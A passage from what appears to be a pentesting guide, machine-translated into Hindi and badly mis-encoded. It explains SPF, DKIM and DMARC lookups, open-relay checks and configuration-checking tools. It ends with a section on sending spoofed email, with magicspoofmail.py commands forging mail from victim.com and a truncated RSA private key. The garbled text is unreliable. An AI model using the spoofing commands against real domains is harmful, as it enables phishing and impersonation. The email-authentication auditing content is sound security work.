| INCLUDE   | рджреВрд╕рд░реЗ рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрддрд╛ рд╣реИред рдпрджрд┐ рдЙрд╕ рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдкрд╛рд╕ рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ рдореИрдХреЗрдирд┐рдЬрд╝реНрдо рдкрд╛рд╕ рд╣реЛрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рд╢рд╛рдорд┐рд▓ рдХреА рдЧрдИ рдиреАрддрд┐ рд╡рд┐рдлрд▓ рд╣реЛрддреА рд╣реИ, рддреЛ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдЬрд╛рд░реА рд░рд╣рддреА рд╣реИред рдХрд┐рд╕реА рдЕрдиреНрдп рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред                                                                                     |
| REDIRECT  | <p>рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдПрдХ рдЕрдиреНрдп рдбреЛрдореЗрди рдирд╛рдо рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ SPF рдиреАрддрд┐ рдХреА рдореЗрдЬрдмрд╛рдиреА рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рдЙрди рдмрд╣реБрдд рд╕рд╛рд░реЗ рдбреЛрдореЗрдиреНрд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬреЛ рд╕рдорд╛рди рдИрдореЗрд▓ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рддреЗ рд╣реИрдВред</p><p>рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдореИрдХреЗрдирд┐рдЬрд╝реНрдо рдореЗрдВ рджрд░реНрд╢рд╛рдП рдЧрдП рдбреЛрдореЗрди рдХреА SPF рдиреАрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред</p> |

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **Qualifiers** рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЬрд╛ рд╕рдХреЗ рдЬреЛ рдпрд╣ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реИрдВ **рдХрд┐ рдпрджрд┐ рдХреЛрдИ рдореИрдХреЗрдирд┐рдЬрд╝реНрдо рдореИрдЪ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдХреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **qualifier "+"** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдХреЛрдИ рдореИрдХреЗрдирд┐рдЬрд╝реНрдо рдореИрдЪ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдЕрдиреБрдордд рд╣реИ)ред\
рдЖрдорддреМрд░ рдкрд░ рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ SPF рдиреАрддрд┐ рдХреЗ рдЕрдВрдд рдореЗрдВ** рдХреБрдЫ рдРрд╕рд╛ рджреЗрдЦреЗрдВрдЧреЗ: **\~all** рдпрд╛ **-all**ред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдпрд╣ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ **рдпрджрд┐ рдкреНрд░реЗрд╖рдХ рдХрд┐рд╕реА рднреА SPF рдиреАрддрд┐ рд╕реЗ рдореИрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдИрдореЗрд▓ рдХреЛ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп (\~) рдХреЗ рд░реВрдк рдореЗрдВ рдЯреИрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдпрд╛ рдИрдореЗрд▓ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ (-) рдХрд░ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред**

#### Qualifiers

рдкреНрд░рддреНрдпреЗрдХ рдореИрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЛ рдЪрд╛рд░ qualifiers рдореЗрдВ рд╕реЗ рдПрдХ рдХреЗ рд╕рд╛рде рд╕рдВрдпреЛрдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* **`+`** PASS рдкрд░рд┐рдгрд╛рдо рдХреЗ рд▓рд┐рдПред рдЗрд╕реЗ рдЫреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ; рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `+mx` рд╡рд╣реА рд╣реИ рдЬреИрд╕реЗ `mx`ред
* **`?`** NEUTRAL рдкрд░рд┐рдгрд╛рдо рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕реЗ NONE (рдХреЛрдИ рдиреАрддрд┐ рдирд╣реАрдВ) рдХреА рддрд░рд╣ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **`~`** (tilde) SOFTFAIL рдХреЗ рд▓рд┐рдП, NEUTRAL рдФрд░ FAIL рдХреЗ рдмреАрдЪ рдПрдХ рдбрд┐рдмрдЧрд┐рдВрдЧ рд╕рд╣рд╛рдпрддрд╛ред рдЖрдорддреМрд░ рдкрд░, SOFTFAIL рд╡рд╛рдкрд╕ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЯреИрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **`-`** (minus) FAIL рдХреЗ рд▓рд┐рдП, рдореЗрд▓ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (рдиреАрдЪреЗ рджреЗрдЦреЗрдВ)ред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк **google.com рдХреА SPF рдиреАрддрд┐** рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкрд╣рд▓реА SPF рдиреАрддрд┐ рдЕрдиреНрдп рдбреЛрдореЗрдиреНрд╕ рдХреА SPF рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдХреИрд╕реЗ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ:**
```shell-session
kali@kali:~$ dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

kali@kali:~$ dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

kali@kali:~$ dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

kali@kali:~$ dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

kali@kali:~$ dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
рдкрд╛рд░рдВрдкрд░рд┐рдХ рд░реВрдк рд╕реЗ рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдХрд┐ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдирд╛рдо рдХреЛ рд╕реНрдкреВрдл рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рд╕рд╣реА/рдХреЛрдИ SPF рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рд╣реЛрддрд╛ рдерд╛ред **рдЖрдЬрдХрд▓**, рдпрджрд┐ **рдИрдореЗрд▓** рдХрд┐рд╕реА **рдбреЛрдореЗрди рд╕реЗ рдЖрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рдиреНрдп SPF рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рд╣реИ** рддреЛ рд╢рд╛рдпрдж рд╡рд╣ **рдЕрд╕реНрд╡реАрдХреГрдд/рд╕реНрд╡рддрдГ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдбреЛрдореЗрди рдХреЗ SPF рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдСрдирд▓рд╛рдЗрди рдЯреВрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM

DomainKeys Identified Mail (DKIM) рдПрдХ рддрдВрддреНрд░ рд╣реИ рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ **рдмрд╛рд╣рд░реА рдИрдореЗрд▓ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╡рд┐рджреЗрд╢реА MTAs рджреНрд╡рд╛рд░рд╛ DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЛрдореЗрди рдХреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рдорд╛рдиреНрдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред DKIM рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдПрдХ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП TXT рд░рд┐рдХреЙрд░реНрдб рдХреЗ рднреАрддрд░ рд░рдЦреА рдЬрд╛рддреА рд╣реИ; рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд▓реЗрдХреНрдЯрд░ рдФрд░ рдбреЛрдореЗрди рдирд╛рдо рджреЛрдиреЛрдВ рдХрд╛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдлрд┐рд░, рдХреБрдВрдЬреА рдорд╛рдВрдЧрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдбреЛрдореЗрди рдирд╛рдо рдФрд░ рдореЗрд▓ рд╣реЗрдбрд░ `DKIM-Signature` рд╕реЗ рдореЗрд▓ рдХрд╛ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдЪрд╛рд╣рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `d=gmail.com;s=20120113`
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC

рдбреЛрдореЗрди-рдЖрдзрд╛рд░рд┐рдд рд╕рдВрджреЗрд╢ рдкреНрд░рдорд╛рдгреАрдХрд░рдг, рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рдФрд░ рдЕрдиреБрдкрд╛рд▓рди (DMARC) рдПрдХ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдореЗрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реИ рдЬреЛ SPF рдФрд░ DKIM рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИред рдиреАрддрд┐рдпрд╛рдВ рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдирд┐рд░реНрджреЗрд╢ рджреЗрддреА рд╣реИрдВ рдХрд┐ рдХрд┐рд╕реА рджрд┐рдП рдЧрдП рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдИрдореЗрд▓ рдХреЛ рдХреИрд╕реЗ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рдХрд┐рдП рдЧрдП рдХрд╛рд░реНрдпреЛрдВ рдкрд░ рд░рд┐рдкреЛрд░реНрдЯ рдХрд░реЗрдВред

![](<../../.gitbook/assets/image (134).png>)

**DMARC рд░рд┐рдХреЙрд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рд╕рдмрдбреЛрдореЗрди \_dmarc рдХреА рдХреНрд╡реЗрд░реА рдХрд░рдиреА рд╣реЛрдЧреА**
```shell-session
root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC
_dmarc.yahoo.com.  1785 IN TXT "v=DMARC1\; p=reject\; sp=none\; pct=100\;
rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\;"

root@kali:~# dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com. 600 IN TXT "v=DMARC1\; p=quarantine\; rua=mailto:mailauth-reports@google.com"

root@kali:~# dig _dmarc.paypal.com txt | grep DMARC
_dmarc.paypal.com. 300 IN TXT "v=DMARC1\; p=reject\; rua=mailto:d@rua.agari.com\;
ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com"
```
#### DMARC рдЯреИрдЧреНрд╕

| рдЯреИрдЧ рдирд╛рдо | рдЙрджреНрджреЗрд╢реНрдп                                          | рдЙрджрд╛рд╣рд░рдг                          |
| -------- | ------------------------------------------------- | ------------------------------- |
| v        | рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рдВрд╕реНрдХрд░рдг                                  | v=DMARC1                        |
| pct      | рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдХреЗ рдЕрдзреАрди рд╕рдВрджреЗрд╢реЛрдВ рдХрд╛ рдкреНрд░рддрд┐рд╢рдд               | pct=20                          |
| ruf      | рдлреЛрд░реЗрдВрд╕рд┐рдХ рд░рд┐рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ URI             | ruf=mailto:authfail@example.com |
| rua      | рд╕рд╛рдореВрд╣рд┐рдХ рд░рд┐рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ URI               | rua=mailto:aggrep@example.com   |
| p        | рд╕рдВрдЧрдардирд╛рддреНрдордХ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдиреАрддрд┐                         | p=quarantine                    |
| sp       | OD рдХреЗ рд╕рдмрдбреЛрдореЗрдиреНрд╕ рдХреЗ рд▓рд┐рдП рдиреАрддрд┐                          | sp=reject                       |
| adkim    | DKIM рдХреЗ рд▓рд┐рдП рд╕рдВрд░реЗрдЦрдг рдореЛрдб                              | adkim=s                         |
| aspf     | SPF рдХреЗ рд▓рд┐рдП рд╕рдВрд░реЗрдЦрдг рдореЛрдб                               | aspf=r                          |

### **рд╕рдмрдбреЛрдореЗрдиреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛?**

**рдпрд╣рд╛рдБ рд╕реЗ** [**рдпрд╣рд╛рдБ**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
рдЖрдкрдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╕рдмрдбреЛрдореЗрди рд╕реЗ рдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд▓рдЧ SPF рд░рд┐рдХреЙрд░реНрдбреНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореВрд▓ рд░реВрдк рд╕реЗ openspf.org рдкрд░ рдкреЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЬреЛ рдЗрд╕ рддрд░рд╣ рдХреА рдЪреАрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╢рд╛рдирджрд╛рд░ рд╕рдВрд╕рд╛рдзрди рд╣реБрдЖ рдХрд░рддрд╛ рдерд╛ред

> рдж рдбреЗрдорди рдХреНрд╡реЗрд╢реНрдЪрди: рд╕рдмрдбреЛрдореЗрдиреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛?
>
> рдЕрдЧрд░ рдореБрдЭреЗ pielovers.demon.co.uk рд╕реЗ рдореЗрд▓ рдорд┐рд▓рддрд╛ рд╣реИ, рдФрд░ pielovers рдХреЗ рд▓рд┐рдП рдХреЛрдИ SPF рдбреЗрдЯрд╛ рдирд╣реАрдВ рд╣реИ, рддреЛ рдХреНрдпрд╛ рдореБрдЭреЗ рдПрдХ рд╕реНрддрд░ рдкреАрдЫреЗ рдЬрд╛рдХрд░ demon.co.uk рдХреЗ рд▓рд┐рдП SPF рдЯреЗрд╕реНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? рдирд╣реАрдВред рдбреЗрдорди рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рд╕рдмрдбреЛрдореЗрди рдПрдХ рдЕрд▓рдЧ рдЧреНрд░рд╛рд╣рдХ рд╣реИ, рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдЧреНрд░рд╛рд╣рдХ рдХреА рдЕрдкрдиреА рдиреАрддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдбреЗрдорди рдХреА рдиреАрддрд┐ рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдкрдиреЗ рд╕рднреА рдЧреНрд░рд╛рд╣рдХреЛрдВ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрдирд╛ рд╕рдордЭ рдореЗрдВ рдирд╣реАрдВ рдЖрддрд╛; рдЕрдЧрд░ рдбреЗрдорди рдРрд╕рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкреНрд░рддреНрдпреЗрдХ рд╕рдмрдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП SPF рд░рд┐рдХреЙрд░реНрдбреНрд╕ рд╕реЗрдЯрдЕрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИред
>
> рдЗрд╕рд▓рд┐рдП SPF рдкреНрд░рдХрд╛рд╢рдХреЛрдВ рдХреЛ рд╕рд▓рд╛рд╣ рдпрд╣ рд╣реИ: рдЖрдкрдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╕рдмрдбреЛрдореЗрди рдпрд╛ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреЗ рд▓рд┐рдП рдПрдХ SPF рд░рд┐рдХреЙрд░реНрдб рдЬреЛрдбрд╝рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдореЗрдВ рдПрдХ A рдпрд╛ MX рд░рд┐рдХреЙрд░реНрдб рд╣реЛред
>
> рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб A рдпрд╛ MX рд░рд┐рдХреЙрд░реНрдбреНрд╕ рд╡рд╛рд▓реА рд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рднреА рдПрдХ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб SPF рд░рд┐рдХреЙрд░реНрдб рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕ рд░реВрдк рдореЗрдВ: \* IN TXT "v=spf1 -all"

рдпрд╣ рд╕рдордЭ рдореЗрдВ рдЖрддрд╛ рд╣реИ - рдПрдХ рд╕рдмрдбреЛрдореЗрди рднреМрдЧреЛрд▓рд┐рдХ рд╕реНрдерд╛рди рдореЗрдВ рдмрд╣реБрдд рдЕрд▓рдЧ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреА SPF рдкрд░рд┐рднрд╛рд╖рд╛ рдмрд╣реБрдд рдЕрд▓рдЧ рд╣реЛ рд╕рдХрддреА рд╣реИред

### **рдУрдкрди рд░рд┐рд▓реЗ**

рд╕реНрдкреИрдо рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП рдИрдореЗрд▓реНрд╕ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдП рдЬрд╛рдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рддрдХ рди рдкрд╣реБрдБрдЪрдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рдкреНрд░реЗрд╖рдХ рдПрдХ **рд░рд┐рд▓реЗ рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕ рдкрд░ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ**ред рдЕрдХреНрд╕рд░, рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ **рдЕрд╡рд▓реЛрдХрди рдирд╣реАрдВ рд╣реЛрддрд╛** рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдХрд┐рди **IP** рд░реЗрдВрдЬреЛрдВ рдХреЛ **рдЕрдиреБрдорддрд┐** рджреЗрдиреА рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд╕реЗ SMTP рд╕рд░реНрд╡рд░ рдХрд╛ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо рдЕрднреА рднреА рдмрд╛рд╣рд░реА рдФрд░ рдЖрдВрддрд░рд┐рдХ рдкреЗрдирдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдХреНрд╕рд░ рдкрд╛рддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рд╡реЗ **рд╕рднреА IP рдкрддреЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ рдИрдореЗрд▓ рдЯреНрд░реИрдлрд╝рд┐рдХ рдореЗрдВ рддреНрд░реБрдЯрд┐рдпрд╛рдБ рди рд╣реЛрдВ рдФрд░ рдЗрд╕ рддрд░рд╣ рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдФрд░ рд╡рд░реНрддрдорд╛рди рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рдореЗрдВ рдмрд╛рдзрд╛ рдпрд╛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд╡реНрдпрд╡рдзрд╛рди рди рд╣реЛред
```shell-session
mynetworks = 0.0.0.0/0
```

```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **рдЙрдкрдХрд░рдг**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPF рдФрд░ DMARC рдХреА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ SPF рдФрд░ DMARC рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

### рд╕реНрдкреВрдл рдИрдореЗрд▓ рднреЗрдЬреЗрдВ

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)\*\*\*\*

**рдпрд╛ рдЖрдк рдПрдХ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)\*\*\*\*
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЛ **dkim python lib рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдХреЛрдИ рддреНрд░реБрдЯрд┐** рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╕рдВрдХреЛрдЪ рди рдХрд░реЗрдВред\
**рдиреЛрдЯ**: рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рд╕рдорд╛рдзрд╛рди рд╣реИ рддрд╛рдХрд┐ рдЬрд▓реНрджреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд╕рдХреЗ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ openssl рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреА рдХреЛ **dkim рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░реНрд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛**ред
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
